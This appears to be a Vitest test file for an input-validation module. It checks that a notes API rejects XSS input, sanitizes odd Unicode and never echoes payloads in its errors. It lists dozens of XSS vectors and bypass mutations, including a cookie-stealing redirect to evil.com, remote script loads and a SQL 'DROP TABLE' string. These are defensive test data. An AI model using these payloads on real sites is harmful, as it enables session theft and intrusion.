/**
 * XSS Integration Tests
 * 
 * These tests verify the complete XSS prevention pipeline:
 * 1. Input validation rejects XSS payloads
 * 2. Sanitization neutralizes dangerous content
 * 3. Error responses never echo attacker payloads
 * 
 * NO REAL SECRETS REQUIRED - all tests use mock data.
 */

import { describe, it, expect, vi } from "vitest";
import {
  validatePlainText,
  sanitizePlainText,
  collectErrors,
  FIELD_CONFIGS,
} from "../inputValidation";

// =============================================================================
// COMPREHENSIVE XSS ATTACK VECTORS
// =============================================================================

/**
 * Real-world XSS payloads from OWASP and security research.
 * Each should be rejected by our validation system.
 */
const OWASP_XSS_VECTORS = [
  // Basic script injection
  '<script>alert(1)</script>',
  '<script src="http://evil.com/xss.js"></script>',
  '<script>document.location="http://evil.com/?c="+document.cookie</script>',
  
  // Image-based XSS
  '<img src=x onerror=alert(1)>',
  '<img src="javascript:alert(1)">',
  '<img """><script>alert(1)</script>">',
  '<img src=`javascript:alert(1)`>',
  
  // SVG-based XSS
  '<svg onload=alert(1)>',
  '<svg/onload=alert(1)>',
  '<svg><script>alert(1)</script></svg>',
  '<svg><animate onbegin=alert(1)>',
  
  // Event handler XSS
  '<body onload=alert(1)>',
  '<div onmouseover="alert(1)">hover me</div>',
  '<input onfocus=alert(1) autofocus>',
  '<marquee onstart=alert(1)>',
  '<video><source onerror=alert(1)>',
  '<audio src=x onerror=alert(1)>',
  '<details open ontoggle=alert(1)>',
  '<object data="javascript:alert(1)">',
  '<embed src="javascript:alert(1)">',
  '<form action="javascript:alert(1)"><input type=submit>',
  
  // Protocol-based XSS
  'javascript:alert(1)',
  'javascript:alert(String.fromCharCode(88,83,83))',
  'vbscript:msgbox(1)',
  'data:text/html,<script>alert(1)</script>',
  'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
  
  // Encoding bypass attempts
  '&#60;script&#62;alert(1)&#60;/script&#62;',
  '&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;',
  '%3Cscript%3Ealert(1)%3C/script%3E',
  '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
  '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',
  
  // Template injection
  '${alert(1)}',
  '{{constructor.constructor("alert(1)")()}}',
  '${7*7}', // SSTI probe
  '{{7*7}}',
  
  // CSS-based XSS
  '<style>body{background:url("javascript:alert(1)")}</style>',
  '<div style="background:url(javascript:alert(1))">',
  'expression(alert(1))',
  '-moz-binding:url("http://evil.com/xss.xml#xss")',
  
  // DOM clobbering
  '<form id="location" action="http://evil.com">',
  '<input name="innerHTML" value="<img src=x onerror=alert(1)>">',
  
  // Polyglot XSS
  'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
  '\'"--!><img src=x onerror=alert(1)>',
];

/**
 * Payloads that attempt to bypass validation through mutation.
 */
const BYPASS_ATTEMPTS = [
  // Case variations
  '<ScRiPt>alert(1)</ScRiPt>',
  '<SCRIPT>alert(1)</SCRIPT>',
  '<scRIPT>alert(1)</scRIPT>',
  
  // Null byte injection
  '<scr\0ipt>alert(1)</scr\0ipt>',
  'java\0script:alert(1)',
  
  // Whitespace variations
  '<script >alert(1)</script >',
  '<script\t>alert(1)</script>',
  '<script\n>alert(1)</script>',
  '<script\r>alert(1)</script>',
  
  // Incomplete tags (testing parser edge cases)
  '<script>alert(1)',
  '<script>alert(1)<',
  '<img src=x onerror=alert(1)',
  
  // Unicode variations
  '＜script＞alert(1)＜/script＞', // Full-width
  '<script\u200Dalert(1)\u200D</script>', // Zero-width joiner
  
  // Nested attempts
  '<<script>script>alert(1)</</script>script>',
  '<scr<script>ipt>alert(1)</scr</script>ipt>',
];

/**
 * Edge cases that should be ACCEPTED (not XSS).
 */
const FALSE_POSITIVE_TESTS = [
  // Mathematical expressions (should be blocked due to < >)
  // 'x < 10 && y > 5', // This IS blocked due to < >
  // '5 > 3', // This IS blocked
  
  // Normal text that might trigger false positives
  'Hello World!',
  'The quick brown fox jumps over the lazy dog.',
  'Email: user@example.com',
  "I'm using quotes and apostrophes!",
  'Question? Answer!',
  '123.456.789',
  '/path/to/file',
  'https://example.com/path',
  'Use *asterisks* for emphasis',
  'Use _underscores_ for emphasis',
  'This is a "quoted" phrase',
];

// =============================================================================
// VALIDATION COMPLETENESS TESTS
// =============================================================================

describe("XSS Validation Completeness", () => {
  describe("OWASP XSS vectors", () => {
    it.each(OWASP_XSS_VECTORS)(
      "should reject OWASP vector: %s",
      (payload) => {
        const result = validatePlainText("field", payload, { maxLength: 10000 });
        
        expect(result.ok).toBe(false);
        if (result.ok === false) {
          expect(["DISALLOWED_CHARS", "POSSIBLE_XSS"]).toContain(result.errorCode);
        }
      }
    );
  });
  
  describe("bypass attempts", () => {
    it.each(BYPASS_ATTEMPTS)(
      "should reject bypass attempt: %s",
      (payload) => {
        const result = validatePlainText("field", payload, { maxLength: 10000 });
        
        expect(result.ok).toBe(false);
      }
    );
  });
  
  describe("false positive prevention", () => {
    it.each(FALSE_POSITIVE_TESTS)(
      "should accept safe input: %s",
      (input) => {
        const result = validatePlainText("field", input, { maxLength: 10000 });
        
        expect(result.ok).toBe(true);
      }
    );
  });
});

// =============================================================================
// SIMULATION: Note Submission Flow
// =============================================================================

describe("Note Submission Flow", () => {
  /**
   * Simulates the complete note submission validation flow.
   * Returns what the API response would be.
   */
  function simulateNoteSubmission(noteData: {
    title?: unknown;
    content?: unknown;
    author?: unknown;
  }): { status: number; body: Record<string, unknown> } {
    const titleResult = validatePlainText("title", noteData.title, {
      maxLength: 120,
      minLength: 1,
    });
    
    const contentResult = validatePlainText("content", noteData.content, {
      maxLength: 5000,
      minLength: 1,
      preserveNewlines: true,
    });
    
    const authorResult = validatePlainText("author", noteData.author, {
      maxLength: 60,
      minLength: 1,
    });
    
    const errors = collectErrors(titleResult, contentResult, authorResult);
    
    if (errors) {
      // Return 400 with field names and error codes ONLY
      // NEVER echo the payload back
      return {
        status: 400,
        body: {
          code: "INVALID_INPUT",
          fields: Object.keys(errors).map(field => ({
            field,
            error: errors[field],
          })),
        },
      };
    }
    
    // Simulate successful storage (we'd use sanitized values)
    return {
      status: 200,
      body: {
        success: true,
        id: "mock-uuid",
      },
    };
  }
  
  it("should accept valid note submission", () => {
    const response = simulateNoteSubmission({
      title: "My Note Title",
      content: "This is the content of my note.",
      author: "John Doe",
    });
    
    expect(response.status).toBe(200);
    expect(response.body.success).toBe(true);
  });
  
  it("should reject note with XSS in title", () => {
    const response = simulateNoteSubmission({
      title: '<script>alert(1)</script>',
      content: "Normal content",
      author: "John Doe",
    });
    
    expect(response.status).toBe(400);
    expect(response.body.code).toBe("INVALID_INPUT");
    
    // Verify response doesn't echo the payload
    expect(JSON.stringify(response.body)).not.toContain("<script>");
    expect(JSON.stringify(response.body)).not.toContain("alert");
  });
  
  it("should reject note with XSS in content", () => {
    const response = simulateNoteSubmission({
      title: "Normal Title",
      content: '<img src=x onerror=alert(document.cookie)>',
      author: "John Doe",
    });
    
    expect(response.status).toBe(400);
    expect(JSON.stringify(response.body)).not.toContain("<img");
    expect(JSON.stringify(response.body)).not.toContain("onerror");
  });
  
  it("should reject note with XSS in author", () => {
    const response = simulateNoteSubmission({
      title: "Normal Title",
      content: "Normal content",
      author: 'javascript:alert(1)',
    });
    
    expect(response.status).toBe(400);
    expect(JSON.stringify(response.body)).not.toContain("javascript:");
  });
  
  it("should reject note with multiple XSS fields", () => {
    const response = simulateNoteSubmission({
      title: '<script>steal(cookies)</script>',
      content: '<svg onload=exfiltrate()>',
      author: '<img src=x onerror=pwn()>',
    });
    
    expect(response.status).toBe(400);
    
    // All fields should be reported
    const fields = (response.body.fields as Array<{ field: string }>).map(f => f.field);
    expect(fields).toContain("title");
    expect(fields).toContain("content");
    expect(fields).toContain("author");
    
    // None of the payloads should be echoed
    const bodyString = JSON.stringify(response.body);
    expect(bodyString).not.toContain("<script>");
    expect(bodyString).not.toContain("<svg");
    expect(bodyString).not.toContain("<img");
  });
  
  it("should handle content too long", () => {
    const response = simulateNoteSubmission({
      title: "Title",
      content: "a".repeat(5001),
      author: "Author",
    });
    
    expect(response.status).toBe(400);
    const fields = response.body.fields as Array<{ field: string; error: string }>;
    const contentError = fields.find(f => f.field === "content");
    expect(contentError?.error).toBe("TOO_LONG");
  });
});

// =============================================================================
// ERROR RESPONSE SECURITY
// =============================================================================

describe("Error Response Security", () => {
  it("should never include raw attacker payload in error response", () => {
    const maliciousPayloads = [
      '<script>alert(1)</script>',
      '"><script>evil()</script>',
      "'; DROP TABLE users; --",
      '${process.env.SECRET_KEY}',
    ];
    
    for (const payload of maliciousPayloads) {
      const result = validatePlainText("field", payload, { maxLength: 100 });
      
      if (!result.ok) {
        // The result should only contain: ok, errorCode, field
        expect(result).toHaveProperty("ok", false);
        expect(result).toHaveProperty("errorCode");
        expect(result).toHaveProperty("field", "field");
        
        // Should NOT contain the value
        expect(result).not.toHaveProperty("value");
        expect(result).not.toHaveProperty("input");
        expect(result).not.toHaveProperty("payload");
        
        // Serialize and check the payload isn't there
        const serialized = JSON.stringify(result);
        expect(serialized).not.toContain(payload);
      }
    }
  });
  
  it("collectErrors should only return field names and codes", () => {
    const results = [
      validatePlainText("title", '<script>alert(1)</script>', { maxLength: 100 }),
      validatePlainText("content", '<img onerror=evil>', { maxLength: 100 }),
    ];
    
    const errors = collectErrors(...results);
    
    expect(errors).toEqual({
      title: "DISALLOWED_CHARS",
      content: "DISALLOWED_CHARS",
    });
    
    // No payloads in the error object
    const serialized = JSON.stringify(errors);
    expect(serialized).not.toContain("<script>");
    expect(serialized).not.toContain("<img");
  });
});

// =============================================================================
// SANITIZATION EDGE CASES
// =============================================================================

describe("Sanitization Edge Cases", () => {
  it("should handle Unicode normalization attacks", () => {
    // Homograph attack: Cyrillic 'е' looks like Latin 'e'
    // After NFKC normalization, certain characters normalize to standard forms
    const input = "tеst"; // Contains Cyrillic 'е' (U+0435)
    const sanitized = sanitizePlainText(input);
    
    // The Cyrillic character should remain (NFKC doesn't change different scripts)
    // But the function should handle it without crashing
    expect(typeof sanitized).toBe("string");
  });
  
  it("should handle zero-width characters", () => {
    const input = "hel\u200Blo"; // Zero-width space
    const sanitized = sanitizePlainText(input);
    
    // Zero-width space should be normalized
    expect(typeof sanitized).toBe("string");
  });
  
  it("should handle mixed direction text", () => {
    const input = "Hello \u202Eevil\u202C World"; // RTL override
    const sanitized = sanitizePlainText(input);
    
    expect(typeof sanitized).toBe("string");
  });
  
  it("should handle extremely long input without crashing", () => {
    const input = "a".repeat(1_000_000);
    
    expect(() => {
      sanitizePlainText(input);
    }).not.toThrow();
    
    const result = validatePlainText("field", input, { maxLength: 100 });
    expect(result.ok).toBe(false);
    if (result.ok === false) {
      expect(result.errorCode).toBe("TOO_LONG");
    }
  });
  
  it("should handle rapid repeated validation without memory issues", () => {
    const iterations = 10000;
    const payload = '<script>alert(1)</script>';
    
    for (let i = 0; i < iterations; i++) {
      const result = validatePlainText("field", payload, { maxLength: 100 });
      expect(result.ok).toBe(false);
    }
  });
});

// =============================================================================
// FIELD-SPECIFIC VALIDATION
// =============================================================================

describe("Field-Specific Validation Rules", () => {
  it("should validate case_title with max 120 chars", () => {
    const valid = validatePlainText("case_title", "A".repeat(120), { maxLength: 120 });
    expect(valid.ok).toBe(true);
    
    const tooLong = validatePlainText("case_title", "A".repeat(121), { maxLength: 120 });
    expect(tooLong.ok).toBe(false);
  });
  
  it("should validate note_text with max 5000 chars and newlines", () => {
    const multiline = "Line 1\nLine 2\nLine 3".repeat(100);
    const result = validatePlainText("note_text", multiline, {
      maxLength: 5000,
      preserveNewlines: true,
    });
    expect(result.ok).toBe(true);
  });
  
  it("should validate user_display_name with max 60 chars", () => {
    const valid = validatePlainText("user_display_name", "John Doe", { maxLength: 60 });
    expect(valid.ok).toBe(true);
    
    const tooLong = validatePlainText("user_display_name", "A".repeat(61), { maxLength: 60 });
    expect(tooLong.ok).toBe(false);
  });
});
